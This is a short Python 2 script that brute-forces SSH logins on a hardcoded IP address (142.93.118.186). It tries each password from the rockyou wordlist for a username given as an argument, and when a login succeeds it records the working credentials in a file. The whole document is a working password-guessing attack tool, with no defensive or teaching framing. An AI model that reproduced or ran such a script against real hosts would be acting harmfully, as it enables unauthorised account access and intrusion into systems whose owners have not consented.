import gzip
from pexpect import pxssh
from sys import argv

shell = pxssh.pxssh()

host =  '142.93.118.186'
print 'user: ' + argv[1]
user = argv[1]
for word in gzip.open('/usr/share/wordlists/rockyou.txt.gz', 'rb'):
    word = word.strip()
    print word
    try:
        shell.login(host, user, word)
        print "Got it!"
        print (host, user, word)
        with open('results'+argv[1]+'.txt','w') as f:
            f.write(str((host, user, word)))
        exit()
    except Exception:
        pass
